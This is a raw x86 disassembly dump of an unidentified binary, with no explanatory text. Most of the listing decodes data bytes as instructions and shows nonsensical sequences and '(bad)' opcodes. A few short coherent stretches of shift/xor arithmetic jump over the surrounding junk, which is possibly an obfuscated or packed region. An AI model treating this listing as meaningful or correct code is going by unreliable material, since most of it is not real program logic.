  414f91:	xchg   ebp,eax
  414f92:	int3   
  414f93:	push   cs
  414f94:	mov    DWORD PTR [ebx],0x8535ef89
  414f9a:	daa    
  414f9b:	push   es
  414f9c:	sbb    esi,ecx
  414f9e:	mov    dh,0x1a
  414fa0:	fs nop
  414fa2:	jne    0x41500c
  414fa4:	add    eax,0xb23ef468
  414fa9:	push   edx
  414faa:	mov    edi,0xefb87ba5
  414faf:	rcr    DWORD PTR [ebp+0x52487dce],cl
  414fb5:	dec    ebp
  414fb6:	cmc    
  414fb7:	sar    edx,cl
  414fb9:	sub    DWORD PTR [ebp+0x22],edx
  414fbc:	ins    DWORD PTR es:[edi],dx
  414fbd:	xchg   BYTE PTR [ebx+ebp*2+0x6cac4f01],dl
  414fc4:	ds lahf 
  414fc6:	dec    esi
  414fc7:	aas    
  414fc8:	test   DWORD PTR [esp+ebp*4-0xf],0x3894b5bf
  414fd0:	fwait
  414fd1:	cmp    edx,esi
  414fd3:	pusha  
  414fd4:	mov    ds:0xe90bac89,al
  414fd9:	push   esp
  414fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fdb:	ins    BYTE PTR es:[edi],dx
  414fdc:	xor    dl,BYTE PTR [ecx+edx*4+0x5a]
  414fe0:	pop    ebp
  414fe1:	pop    DWORD PTR [eax-0x73]
  414fe4:	aam    0x1d
  414fe6:	ss cwde 
  414fe8:	enter  0xf02b,0x5
  414fec:	pop    esi
  414fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fee:	or     ecx,edi
  414ff0:	fmul   QWORD PTR fs:[ebx+esi*8-0x69e269ed]
  414ff8:	ins    DWORD PTR es:[edi],dx
  414ff9:	push   ss
  414ffa:	retf   
  414ffb:	mov    edi,0x13c8bcbb
  415000:	loopne 0x41500f
  415002:	dec    eax
  415003:	in     eax,dx
  415004:	jb     0x41506d
  415006:	jl     0x41504c
  415008:	dec    esp
  415009:	xor    al,0x97
  41500b:	mov    DWORD PTR [edx],ebp
  41500d:	xchg   edx,eax
  41500e:	call   0x1b9b0486
  415013:	inc    eax
  415014:	mov    ds:0xf7c436d,eax
  415019:	lods   al,BYTE PTR ds:[esi]
  41501a:	enter  0xc102,0xe9
  41501e:	add    cl,BYTE PTR [ebx+0x558b104d]
  415024:	adc    al,0x33
  415026:	(bad)  
  415027:	xor    edx,edx
  415029:	or     eax,edx
  41502b:	lea    eax,[ebp+eax*4-0x7c]
  41502f:	push   eax
  415030:	shl    ecx,0x1e
  415033:	call   0x41182a
  415038:	mov    eax,DWORD PTR [ebp-0x8]
  41503b:	mov    ecx,DWORD PTR [ebp-0x8]
  41503e:	xor    ecx,ebx
  415040:	xor    eax,edi
  415042:	shl    ecx,0x1e
  415045:	shr    eax,0x2
  415048:	or     ecx,eax
  41504a:	push   ecx
  41504b:	lea    eax,[ebp-0x2c]
  41504e:	push   eax
  41504f:	mov    eax,DWORD PTR [ebp+0x10]
  415052:	mov    ecx,DWORD PTR [ebp+0x14]
  415055:	shrd   eax,ecx,0x2
  415059:	shr    ecx,0x2
  41505c:	mov    ecx,DWORD PTR [ebp+0x10]
  41505f:	mov    edx,DWORD PTR [ebp+0x14]
  415062:	xor    edx,edx
  415064:	xor    eax,esi
  415066:	or     eax,edx
  415068:	shl    ecx,0x1e
  41506b:	mov    ecx,DWORD PTR [ebp+0x10]
  41506e:	mov    edx,DWORD PTR [ebp+0x14]
  415071:	shrd   ecx,edx,0x2
  415075:	shr    edx,0x2
  415078:	mov    edx,DWORD PTR [ebp+0x10]
  41507b:	mov    ebx,DWORD PTR [ebp+0x14]
  41507e:	xor    ecx,esi
  415080:	xor    ebx,ebx
  415082:	or     ecx,ebx
  415084:	add    eax,ecx
  415086:	lea    eax,[ebp+eax*4-0x7c]
  41508a:	push   eax
  41508b:	shl    edx,0x1e
  41508e:	call   0x41182a
  415093:	mov    eax,DWORD PTR [ebp-0x8]
  415096:	mov    ecx,DWORD PTR [ebp-0x8]
  415099:	xor    ecx,0xfffffffe
  41509c:	shl    ecx,0x1e
  41509f:	xor    eax,edi
  4150a1:	shr    eax,0x2
  4150a4:	or     ecx,eax
  4150a6:	push   ecx
  4150a7:	lea    eax,[ebp-0x38]
  4150aa:	push   eax
  4150ab:	mov    eax,DWORD PTR [ebp+0x10]
  4150ae:	mov    ecx,DWORD PTR [ebp+0x14]
  4150b1:	shrd   eax,ecx,0x2
  4150b5:	shr    ecx,0x2
  4150b8:	mov    ecx,DWORD PTR [ebp+0x10]
  4150bb:	jmp    0x415445
  4150c0:	int    0x30
  4150c2:	adc    dh,bh
  4150c4:	cmp    al,0x1e
  4150c6:	fnstsw WORD PTR [eax]
  4150c8:	fcom   QWORD PTR es:[edi+0x31059f6f]
  4150cf:	jno    0x415140
  4150d1:	scas   eax,DWORD PTR es:[edi]
  4150d2:	mov    ebx,0xbbc590bb
  4150d7:	mov    ebx,0x3b7bed88
  4150dc:	and    eax,0xe4eb6a36
  4150e1:	icebp  
  4150e2:	lods   eax,DWORD PTR ds:[esi]
  4150e3:	or     edi,eax
  4150e5:	xor    esi,DWORD PTR [ecx]
  4150e7:	loopne 0x41513a
  4150e9:	dec    ebx
  4150ea:	fldcw  WORD PTR [ebx+0x43]
  4150ed:	jmp    0x8dc6:0xdee2523f
  4150f4:	rcl    BYTE PTR [ebp+0x6b],0xb0
  4150f8:	ror    DWORD PTR [ebx-0x3e0bfaf0],0xd1
  4150ff:	repz mul BYTE PTR [ecx]
  415102:	sub    ecx,DWORD PTR [esi]
  415104:	fisttp DWORD PTR [ebp+edx*4-0x64]
  415108:	push   0x92867b21
  41510d:	dec    BYTE PTR [edx+0x44691705]
  415113:	sahf   
  415114:	lahf   
  415115:	mov    bh,BYTE PTR [eax]
  415117:	in     al,dx
  415118:	mov    dl,0x4c
  41511a:	inc    edi
  41511b:	xchg   esi,eax
  41511c:	push   ecx
  41511d:	jl     0x415183
  41511f:	xor    al,0x12
  415121:	sub    DWORD PTR [eax],ebp
  415123:	loop   0x4150c5
  415125:	mov    eax,ds:0xeab3ef90
  41512a:	sbb    dl,ah
  41512c:	clc    
  41512d:	enter  0x30e7,0xe7
  415131:	jo     0x415196
  415133:	aas    
  415134:	popa   
  415135:	sub    edi,ebp
  415137:	xchg   ebp,eax
  415138:	xchg   ebx,eax
  415139:	sbb    DWORD PTR [ecx+0x178e4fd0],edi
  41513f:	std    
  415140:	push   ebp
  415141:	mov    ds:0x94cde1b2,eax
  415146:	ret    0x153d
  415149:	xchg   edi,eax
  41514a:	jp     0x41517b
  41514c:	add    DWORD PTR [ebp-0x75],esp
  41514f:	or     esp,DWORD PTR [ebx+eiz*1]
  415152:	jne    0x41519b
  415154:	ret    
  415155:	imul   esi,DWORD PTR [esi],0x7a98a0be
  41515b:	and    al,0x13
  41515d:	fiadd  WORD PTR [edx-0x51]
  415160:	outs   dx,DWORD PTR ds:[esi]
  415161:	out    dx,al
  415162:	cmp    dl,ah
  415164:	mov    eax,0x2b98431a
  41516a:	xor    eax,0xb2d70604
  41516f:	adc    dh,cl
  415171:	or     edx,edi
  415173:	scas   al,BYTE PTR es:[edi]
  415174:	(bad)  
  415175:	leave  
  415176:	and    edx,DWORD PTR [esp+ebx*4-0x4e275c6e]
  41517d:	mov    eax,0x5009fc4f
  415182:	dec    ebx
  415183:	jmp    0x4151d4
  415185:	push   esp
  415186:	lahf   
  415187:	adc    eax,0xacf56eec
  41518c:	and    BYTE PTR [ecx],dh
  41518e:	and    DWORD PTR [edi+esi*4+0x7c68b802],ecx
  415195:	inc    esp
  415196:	mov    edi,ebx
  415198:	inc    edx
  415199:	cdq    
  41519a:	fnsave [eax+0x10]
  41519d:	daa    
  41519e:	mov    esp,DWORD PTR [ebp-0x4c437839]
  4151a4:	or     DWORD PTR [eax],0xffffffb6
  4151a7:	and    al,0x34
  4151a9:	inc    eax
  4151aa:	inc    esp
  4151ab:	pop    esp
  4151ac:	test   al,0x9d
  4151ae:	push   ecx
  4151af:	aaa    
  4151b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151b1:	retf   0xb162
  4151b4:	xlat   BYTE PTR ds:[ebx]
  4151b5:	or     al,0xbe
  4151b7:	and    al,0x94
  4151b9:	jl     0x415216
  4151bb:	jp     0x4151cd
  4151bd:	mov    WORD PTR [eax+0x87886cb],?
  4151c3:	call   DWORD PTR [ebx-0x3f]
  4151c6:	cmp    eax,0x5e95872e
  4151cb:	(bad)  
  4151cc:	push   eax
  4151cd:	(bad)  
  4151ce:	pop    es
  4151cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151d0:	lahf   
  4151d1:	je     0x4151de
  4151d3:	mov    bl,0xc0
  4151d5:	shr    dl,1
  4151d7:	dec    ebp
  4151d8:	imul   ebp,DWORD PTR ds:0xba99d08e,0xffffff84
  4151df:	mov    dl,0x9a
  4151e1:	inc    ebx
  4151e2:	lock and DWORD PTR [edi+ecx*1+0x68920508],eax
  4151ea:	fwait
  4151eb:	pop    esp
  4151ec:	pop    ds
  4151ed:	dec    edi
  4151ee:	lods   eax,DWORD PTR ds:[esi]
  4151ef:	mov    dh,0x77
  4151f1:	inc    edi
  4151f2:	jne    0x41523e
  4151f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151f5:	mov    DWORD PTR [ecx+0x51],ecx
  4151f8:	mov    cl,0xc7
  4151fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151fb:	out    dx,eax
  4151fc:	and    edx,esi
  4151fe:	add    BYTE PTR [edx],0x11
  415201:	loop   0x4151ef
  415203:	idiv   DWORD PTR [ecx]
  415205:	ds inc edi
  415207:	out    0x19,al
  415209:	mov    ds:0x21f8fb12,eax
  41520e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41520f:	inc    ecx
  415210:	(bad)  
  415211:	and    al,0x1a
  415213:	test   DWORD PTR [eax],ebp
  415215:	fs push 0x7
  415218:	ss and al,0xb1
  41521b:	and    dh,al
  41521d:	mov    WORD PTR [ecx],ds
  41521f:	(bad)  
  415220:	adc    BYTE PTR [edx+0x35d098d5],cl
  415226:	cmp    BYTE PTR [ebp+eiz*2+0x49],ah
  41522a:	mov    esp,0xcb7cfad9
  41522f:	lock fnstenv [eax]
  415232:	(bad)  
  415233:	loopne 0x41528b
  415235:	mov    dh,0x4
  415237:	data16 jg 0x4151ed
  41523a:	dec    ecx
  41523b:	and    bl,bh
  41523d:	inc    ebx
  41523e:	push   esp
  41523f:	sub    dl,BYTE PTR [esi-0x74]
  415242:	ret    0x9c1d
  415245:	(bad)  
  415246:	xchg   ebp,eax
  415247:	xchg   ch,cl
  415249:	and    eax,0x7dc637c4
  41524e:	(bad)  
  41524f:	stc    
  415250:	repz inc BYTE PTR ds:0x215f22fe
  415257:	clc    
  415258:	mov    BYTE PTR [esi-0x418bd015],dh
  41525e:	imul   edx,DWORD PTR [edi+esi*4+0xd3ce0a5],0x3cf1151d
  415269:	(bad)  
  41526a:	sbb    al,0x6e
  41526c:	inc    edi
  41526d:	rol    DWORD PTR [edi],cl
  41526f:	jno    0x4152a0
  415271:	das    
  415272:	sbb    ecx,DWORD PTR [eax]
  415274:	inc    ecx
  415275:	xor    bl,BYTE PTR [ecx+0xd6c2003]
  41527b:	push   ds
  41527c:	test   eax,0x3a9393be
  415281:	dec    eax
  415282:	clc    
  415283:	pop    ebx
  415284:	add    ch,BYTE PTR [esi-0x69]
  415287:	mov    BYTE PTR [ecx+ecx*8+0x21857080],cl
  41528e:	arpl   WORD PTR [ebx],bx
  415290:	xor    BYTE PTR [ebx],ah
  415292:	(bad)  
  415293:	jbe    0x4152b5
  415295:	mov    dh,0x1c
  415297:	loope  0x415235
  415299:	js     0x415224
  41529b:	int3   
  41529c:	adc    al,0x72
  41529e:	stos   DWORD PTR es:[edi],eax
  41529f:	fcom   st(5)
  4152a1:	and    BYTE PTR [eax],bh
  4152a3:	sub    ecx,ecx
  4152a5:	ds adc eax,0x913746bf
  4152ab:	adc    BYTE PTR [edx+eiz*8],bh
  4152ae:	jne    0x415284
  4152b0:	std    
  4152b1:	mov    esi,DWORD PTR ds:0x33ea3a38
  4152b7:	xchg   edx,eax
  4152b8:	ror    BYTE PTR [ebx+0x3e],0x31
  4152bc:	push   DWORD PTR [esi]
  4152be:	vcvtsd2ss xmm6,xmm1,QWORD PTR [ebx-0x5d]
  4152c3:	mov    al,0xc2
  4152c5:	(bad)  
  4152c6:	fild   DWORD PTR [edx-0x52bcb8ed]
  4152cc:	or     esi,DWORD PTR [ebp-0x640a98e3]
  4152d2:	sbb    DWORD PTR [eax-0x46],edx
  4152d5:	pop    esi
  4152d6:	(bad)  
  4152d7:	(bad)  
  4152d8:	mov    ds:0x969cfd8f,al
  4152dd:	jecxz  0x415273
  4152df:	or     al,0xdd
  4152e1:	ja     0x41530b
  4152e3:	cld    
  4152e4:	hlt    
  4152e5:	cwde   
  4152e6:	jno    0x415349
  4152e8:	push   0x4cd680b3
  4152ed:	mul    BYTE PTR [esi-0x59134218]
  4152f3:	test   bh,0x52
  4152f6:	inc    ebx
  4152f7:	jnp    0x4152a8
  4152f9:	mov    cl,0xb0
  4152fb:	and    DWORD PTR [edx],0x5a1bdaf5
  415301:	call   0x9cd9:0x7a657ed1
  415308:	jp     0x4152e3
  41530a:	add    BYTE PTR [ecx],bh
  41530c:	xchg   edx,eax
  41530d:	sar    DWORD PTR [eax],1
  41530f:	mov    cl,0xa0
  415311:	in     eax,dx
  415312:	hlt    
  415313:	xchg   esi,eax
  415314:	xchg   ebx,eax
  415315:	xor    DWORD PTR [ebx],ecx
  415317:	jge    0x4152a7
  415319:	fnstsw WORD PTR [edi]
  41531b:	push   ss
  41531c:	(bad)  
  41531d:	fild   DWORD PTR fs:[ebx+0x1]
  415321:	sti    
  415322:	sahf   
  415323:	ret    
  415324:	das    
  415325:	adc    DWORD PTR [ecx+0x5245c178],0xb05f0652
  41532f:	adc    eax,0xf2f4eeb9
  415334:	out    0xf6,al
  415336:	ins    DWORD PTR es:[edi],dx
  415337:	xor    bl,BYTE PTR [edx-0x28ce30ab]
  41533d:	jp     0x415381
  41533f:	repnz dec esp
  415341:	lahf   
  415342:	cdq    
  415343:	fwait
  415344:	call   0x3090:0x4ec67006
  41534b:	push   ebp
  41534c:	inc    ebp
  41534d:	or     BYTE PTR [edi+0x3f],0x24
  415351:	xor    al,BYTE PTR [ebx+0x53f9fd45]
  415357:	out    dx,eax
  415358:	mov    ds:0x63c9ee22,al
  41535d:	mov    esp,0x8d65668c
  415362:	mov    dh,0xc7
  415364:	add    eax,0x89d57ec1
  415369:	xor    al,BYTE PTR [ecx]
  41536b:	retf   0x6c9d
  41536e:	jne    0x415382
  415370:	pop    edx
  415371:	or     esp,edx
  415373:	mov    dh,0xed
  415375:	mov    ds:0x32004764,al
  41537a:	shr    edi,0x94
  41537d:	ret    0x8854
  415380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415381:	pushf  
  415382:	dec    esi
  415383:	hlt    
  415384:	mov    ds:0x79248abb,eax
  415389:	xor    esi,DWORD PTR [eax+0x30848cc2]
  41538f:	add    eax,0x2d9d5dc2
  415394:	dec    eax
  415395:	pop    eax
  415396:	das    
  415397:	or     al,0xbf
  415399:	xchg   ebx,eax
  41539a:	cmp    DWORD PTR [esi-0x40],0xffffffbd
  41539e:	aam    0xa1
  4153a0:	and    BYTE PTR [edx],dl
  4153a2:	or     DWORD PTR ds:0xc9473e19,ecx
  4153a8:	jmp    0x4153ce
  4153aa:	lock setb BYTE PTR [edi]
  4153ae:	cmp    ebx,DWORD PTR [esi+0x11]
  4153b1:	xchg   BYTE PTR [esi],al
  4153b3:	jg     0x4153f0
  4153b5:	into   
  4153b6:	xor    ecx,DWORD PTR [edi+0x3d]
  4153b9:	jns    0x415371
  4153bb:	dec    eax
  4153bc:	push   ebx
  4153bd:	xchg   ebp,eax
  4153be:	xchg   edx,eax
  4153bf:	xchg   esi,eax
  4153c0:	pusha  
  4153c1:	inc    esi
  4153c2:	mov    edi,DWORD PTR [esp+edx*2]
  4153c5:	or     al,0x1b
  4153c7:	rol    BYTE PTR [edx],cl
  4153c9:	(bad)  
  4153ca:	lods   al,BYTE PTR ds:[esi]
  4153cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153cc:	idiv   DWORD PTR [ecx-0x5dc72d37]
  4153d2:	loop   0x4153d9
  4153d4:	cmp    BYTE PTR [edi],bl
  4153d6:	sub    DWORD PTR [ebx-0x2261dcb1],edi
  4153dc:	data16 mov dl,0x7c
  4153df:	sti    
  4153e0:	enter  0xf313,0x90
  4153e4:	inc    edi
  4153e5:	popf   
  4153e6:	fild   QWORD PTR [esi]
  4153e8:	inc    eax
  4153e9:	fprem1 
  4153eb:	mov    ebp,0xf01894d9
  4153f0:	jmp    0x4932:0xc08b2ea
  4153f7:	mov    BYTE PTR [ebx+0x381c0f53],dh
  4153fd:	pushf  
  4153fe:	xchg   esi,eax
  4153ff:	pop    esi
  415400:	hlt    
  415401:	lahf   
  415402:	int    0xb
  415404:	jle    0x415396
  415406:	test   DWORD PTR [esp+ebp*2+0x5b],ecx
  41540a:	sbb    eax,edx
  41540c:	xchg   esp,eax
  41540d:	data16 addr16 (bad) 
  415410:	push   0x8af7090a
  415415:	cmp    al,al
  415417:	push   ds
  415418:	xor    dl,BYTE PTR [edi-0x1]
  41541b:	ins    BYTE PTR es:[edi],dx
  41541c:	mov    cl,0x41
  41541e:	pop    es
  41541f:	ss xchg edi,eax
  415421:	or     BYTE PTR [edx-0x25],ch
  415424:	loop   0x41546f
  415426:	mov    esp,0x9d5278c2
  41542b:	inc    edi
  41542c:	mov    ds:0xf7006719,eax
  415431:	(bad)  
  415432:	jg     0x415410
  415434:	push   ebx
  415435:	out    dx,al
  415436:	push   edx
  415437:	sbb    eax,0xbb457501
  41543c:	mov    ss,WORD PTR [esi]
  41543e:	in     al,0x62
  415440:	out    0x7b,eax
  415442:	and    eax,0x558bcf6f
  415447:	adc    al,0x33
  415449:	rol    cl,cl
  41544b:	loope  0x41546b
  41544d:	mov    ecx,DWORD PTR [ebp+0x10]
  415450:	xor    eax,esi
  415452:	or     eax,edx
  415454:	mov    edx,DWORD PTR [ebp+0x14]
  415457:	shrd   ecx,edx,0x2
  41545b:	shr    edx,0x2
  41545e:	mov    edx,DWORD PTR [ebp+0x10]
  415461:	mov    ebx,DWORD PTR [ebp+0x14]
  415464:	xor    ecx,esi
  415466:	xor    ebx,ebx
  415468:	or     ecx,ebx
  41546a:	shl    edx,0x1e
  41546d:	add    eax,ecx
  41546f:	mov    ecx,DWORD PTR [ebp+0x10]
  415472:	mov    edx,DWORD PTR [ebp+0x14]
  415475:	jmp    0x4157ff
  41547a:	fdivr  DWORD PTR [esi-0x49]
  41547d:	mov    edi,0x9db9f7bd
  415482:	mov    cl,BYTE PTR [edi+0x25960537]
  415488:	pop    edi
  415489:	xor    DWORD PTR [edi+esi*4-0x45],eax
  41548d:	mov    ebx,0xbbbbc590
  415492:	jecxz  0x4154fc
  415494:	push   edx
  415495:	inc    eax
  415496:	inc    edx
  415497:	sbb    dh,BYTE PTR [ebx+0x15ba7bf3]
  41549d:	and    dl,dl
  41549f:	pop    ebp
  4154a0:	cmp    ebp,DWORD PTR [edi-0x49e0eb16]
  4154a6:	or     eax,0xef08d1c4
  4154ab:	mov    ebx,0xea605b51
  4154b0:	and    al,0xa2
  4154b2:	xchg   esp,eax
  4154b3:	xchg   esp,esp
  4154b5:	xor    al,0xeb
  4154b7:	cmp    al,0xcb
  4154b9:	pop    ecx
  4154ba:	push   esi
  4154bb:	xor    ah,dh
  4154bd:	push   esp
  4154be:	dec    eax
  4154bf:	or     ebx,DWORD PTR ss:[ebx-0x5b6dd67e]
  4154c6:	mov    BYTE PTR [ebx+0x22aa7f00],al
  4154cc:	fcmovbe st,st(1)
  4154ce:	loopne 0x4154f6
  4154d0:	popf   
  4154d1:	das    
  4154d2:	inc    edi
  4154d3:	xchg   esp,eax
  4154d4:	mov    ?,WORD PTR [ebx-0xb]
  4154d7:	xchg   DWORD PTR [ebx-0xc],ecx
  4154da:	js     0x41553d
  4154dc:	imul   edi,DWORD PTR [edx-0x6d],0xffffff97
  4154e0:	or     al,0xbf
  4154e2:	clc    
  4154e3:	repnz mov bl,0xfc
  4154e6:	clc    
  4154e7:	loop   0x41555a
  4154e9:	stos   DWORD PTR es:[edi],eax
  4154ea:	jo     0x415497
  4154ec:	test   DWORD PTR [edi+0x8],edi
  4154ef:	cmp    al,0xcd
  4154f1:	icebp  
  4154f2:	cmp    BYTE PTR [esi],0x2b
  4154f5:	mov    al,ds:0x23827e9f
  4154fa:	mov    ?,WORD PTR [ecx]
  4154fc:	or     ah,BYTE PTR [ebp-0x1445ffb3]
  415502:	push   cs
  415503:	(bad)  
  415504:	adc    eax,0xb77f1fa8
  415509:	scas   eax,DWORD PTR es:[edi]
  41550a:	js     0x415541
  41550c:	mov    bh,0x7f
  41550e:	(bad)
  415512:	xchg   ebx,eax
  415513:	and    eax,DWORD PTR [eax-0x5c2df676]
  415519:	jp     0x4154ff
  41551b:	hlt    
  41551c:	mov    cl,0x3b
  41551e:	xor    al,0xe0
  415520:	imul   esi,DWORD PTR [edx+ecx*4+0x41570061],0xf46f8ac6
  41552b:	add    BYTE PTR [eax+0x10],bh
  41552e:	shl    BYTE PTR [ebx+0x57],1
  415531:	adc    eax,0x8ac70e10
  415536:	lock pop es
  415538:	dec    esi
  415539:	jnp    0x415586
  41553b:	retf   0xce1a
  41553e:	mov    ebx,DWORD PTR fs:[ebx+0x3e]
  415542:	xchg   BYTE PTR [ecx-0x57e40e8f],dl
  415548:	push   ebp
  415549:	icebp  
  41554a:	repnz mov edx,0x9bd97ebd
  415550:	fwait
  415551:	inc    edi
  415552:	jnp    0x4154e8
  415554:	mul    dl
  415556:	(bad)  
  415557:	dec    ch
  415559:	sbb    BYTE PTR [esp+eax*8],bl
  41555c:	repz mov esi,0x6fe4060c
  415562:	inc    ecx
  415563:	sbb    eax,0x52429f81
  415568:	call   0x3a7fc1d
  41556d:	mov    WORD PTR [esi],?
  41556f:	pop    eax
  415570:	(bad)  
  415571:	enter  0xc0d7,0x33
  415575:	outs   dx,DWORD PTR ds:[esi]
  415576:	pop    ebp
  415577:	outs   dx,DWORD PTR ds:[esi]
  415578:	jg     0x415547
  41557a:	jae    0x41555d
  41557c:	xchg   ecx,eax
  41557d:	push   ds
  41557e:	push   ebx
  41557f:	push   ebx
  415580:	mov    ds,WORD PTR [edi]
  415582:	fcomp  QWORD PTR [ebp-0x3d]
  415585:	fldenv [ebp+0x55]
  415588:	push   edi
  415589:	push   edx
  41558a:	mov    ebp,0x4064b954
  41558f:	cmp    ecx,eax
  415591:	lea    esi,[eax-0x4b5b8fe2]
  415597:	outs   dx,DWORD PTR ds:[esi]
  415598:	je     0x415526
  41559a:	mov    ecx,0x3877dc8d
  41559f:	jnp    0x415589
  4155a1:	xor    edx,DWORD PTR [ebx+0x36]
  4155a4:	or     DWORD PTR [eax],edx
  4155a6:	lea    esi,ds:0x81ea288d
  4155ac:	inc    ecx
  4155ad:	jae    0x41554a
  4155af:	mov    ds:0xb9bdd6c4,eax
  4155b4:	sahf   
  4155b5:	xchg   BYTE PTR [ebp+0x54d0401d],bl
  4155bb:	push   ss
  4155bc:	outs   dx,BYTE PTR ds:[esi]
  4155bd:	mul    DWORD PTR [ecx+0x2268285e]
  4155c3:	pop    ebp
  4155c4:	imul   ebx,ebx,0xfffffff5
  4155c7:	cld    
  4155c8:	inc    ebx
  4155c9:	ror    DWORD PTR ds:0x351306ee,cl
  4155cf:	jae    0x41563e
  4155d1:	retf   
  4155d2:	aaa    
  4155d3:	xchg   DWORD PTR [eax],ecx
  4155d5:	dec    ebx
  4155d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155d7:	sbb    dh,BYTE PTR [esi+0x341c0e0c]
  4155dd:	lock mov esp,0x98d95b3d
  4155e3:	push   cs
  4155e4:	das    
  4155e5:	mov    ?,edx
  4155e7:	mov    WORD PTR [edx],gs
  4155e9:	(bad)  
  4155ea:	jbe    0x415599
  4155ec:	icebp  
  4155ed:	add    eax,0x272bd65
  4155f2:	scas   al,BYTE PTR es:[edi]
  4155f3:	ror    DWORD PTR [edi+0x6e],1
  4155f6:	add    ch,ch
  4155f8:	add    eax,0x770ffc35
  4155fd:	jecxz  0x4155b8
  4155ff:	jp     0x415665
  415601:	mov    bh,0x55
  415603:	mov    cl,0x2
  415605:	mov    ch,0x41
  415607:	mov    bh,0xa1
  415609:	sub    esp,DWORD PTR [esi-0xa]
  41560c:	stos   BYTE PTR es:[edi],al
  41560d:	xor    cl,BYTE PTR [ebp+0x79037031]
  415613:	arpl   cx,bx
  415615:	mov    ah,0x3d
  415617:	stos   DWORD PTR es:[edi],eax
  415618:	cld    
  415619:	add    eax,0xcd788c69
  41561e:	enter  0x884,0x4d
  415622:	call   0x7cc7074f
  415627:	add    dh,BYTE PTR [ecx-0x5115b28e]
  41562d:	mov    ds:0xde4030a8,al
  415632:	sbb    eax,0x82e961a5
  415637:	dec    ebp
  415638:	xchg   edi,eax
  415639:	add    cl,BYTE PTR [ebx]
  41563b:	(bad)  
  41563c:	fcmovnbe st,st(0)
  41563e:	mov    esi,0x5e161d72
  415643:	jp     0x4156bc
  415645:	cli    
  415646:	sar    DWORD PTR [eax+0x1ba5af38],1
  41564c:	and    ebx,edi
  41564e:	mov    dl,0x4a
  415650:	sbb    BYTE PTR [esi+0x46ad45ad],ch
  415656:	mov    esi,0x3b1a6eab
  41565b:	push   edi
  41565c:	fstp   DWORD PTR [esi-0x28]
  41565f:	pusha  
  415660:	ret    0x76f2
  415663:	xor    DWORD PTR [esi-0x48],0x66
  415667:	mov    WORD PTR [esi-0x2c],ss
  41566a:	repz adc al,0x78
  41566d:	jg     0x4155f7
  41566f:	dec    edi
  415670:	loopne 0x415643
  415672:	ficom  WORD PTR [ebx+0x6a99d062]
  415678:	xchg   ebp,eax
  415679:	xchg   ebp,eax
  41567a:	inc    edi
  41567b:	fcmovb st,st(7)
  41567d:	imul   ebp,DWORD PTR [edx],0xffffff8c
  415680:	outs   dx,DWORD PTR ds:[esi]
  415681:	mov    eax,0xd6bd58fb
  415686:	fsubr  QWORD PTR [ebx+0x74]
  415689:	shr    ebx,1
  41568b:	and    DWORD PTR [esi+eiz*2],esi
  41568e:	or     eax,0x7aa35791
  415693:	jne    0x4156d5
  415695:	mov    edi,0xc44cbda4
  41569a:	shr    DWORD PTR [esi-0x693b1be4],0x26
  4156a1:	dec    esi
  4156a2:	sahf   
  4156a3:	mov    ebp,0xd7fa0a80
  4156a8:	xchg   ecx,eax
  4156a9:	js     0x41570c
  4156ab:	xor    al,0x3b
  4156ad:	ja     0x41566c
  4156af:	push   ebp
  4156b0:	bound  ecx,QWORD PTR [ebx-0x59ee697a]
  4156b6:	adc    al,0x51
  4156b8:	and    bh,BYTE PTR [ebx-0x34]
  4156bb:	stc    
  4156bc:	mov    eax,DWORD PTR [eax+ebx*1+0x30]
  4156c0:	pop    esi
  4156c1:	jne    0x4156e7
  4156c3:	inc    eax
  4156c4:	fldenv [esi+0x6f20e9bf]
  4156ca:	adc    eax,0x62f896f3
  4156cf:	jp     0x41565f
  4156d1:	loopne 0x4156de
  4156d3:	xor    ebx,DWORD PTR [ebp-0x63]
  4156d6:	retf   
  4156d7:	push   ss
  4156d8:	inc    ebx
  4156d9:	sahf   
  4156da:	mov    ?,WORD PTR [ebx]
  4156dc:	stos   BYTE PTR es:[edi],al
  4156dd:	imul   ecx,DWORD PTR ds:0xf91ec2ff,0x64316fb1
  4156e7:	jg     0x41567f
  4156e9:	ds jge 0x415681
  4156ec:	mov    dh,0x82
  4156ee:	dec    ebp
  4156ef:	imul   eax,esp,0xfc31c591
  4156f5:	mov    esp,0xd6590371
  4156fa:	xchg   BYTE PTR [esi-0x47],al
  4156fd:	rcl    DWORD PTR [edi-0x1e],1
  415700:	adc    edx,edi
  415702:	mov    eax,ds:0x4937bf92
  415707:	inc    ebp
  415708:	jmp    0xfd4013c3
  41570d:	xchg   ebx,eax
  41570e:	pop    ebp
  41570f:	loopne 0x415772
  415711:	lea    ebp,[edx]
  415713:	je     0x415739
  415715:	jbe    0x41576f
  415717:	fild   QWORD PTR [edx-0x4ac40936]
  41571d:	arpl   WORD PTR [eax-0x78f6f7ae],di
  415723:	jae    0x41571a
  415725:	cmp    dl,BYTE PTR [ecx+eiz*4+0x3]
  415729:	xchg   ebp,eax
  41572a:	or     DWORD PTR [esi],ecx
  41572c:	lods   al,BYTE PTR ds:[esi]
  41572d:	pop    edx
  41572e:	dec    ecx
  41572f:	push   esi
  415730:	mov    dh,0x28
  415732:	pusha  
  415733:	mov    dh,0x6
  415735:	rol    DWORD PTR ds:0xe4dc80d0,1
  41573b:	push   eax
  41573c:	cmc    
  41573d:	hlt    
  41573e:	pop    es
  41573f:	add    DWORD PTR ss:[eax-0x466d6e53],eax
  415746:	push   cs
  415747:	mov    eax,0x7617c9cb
  41574c:	xor    BYTE PTR [eax-0x4d],bh
  41574f:	xor    DWORD PTR [ebx],ebx
  415751:	and    DWORD PTR [edi-0x67ed6c59],0xfeb948dd
  41575b:	mov    ds:0xb0a13251,eax
  415760:	adc    dl,BYTE PTR [edi]
  415762:	test   DWORD PTR [ebp-0x6e],esi
  415765:	adc    al,0xac
  415767:	gs jp  0x4157c3
  41576a:	jne    0x415715
  41576c:	enter  0x2ae4,0xba
  415770:	call   0xe83c:0xabffb87c
  415777:	xor    BYTE PTR [ebx-0x135a2093],ah
  41577d:	pop    eax
  41577e:	inc    edx
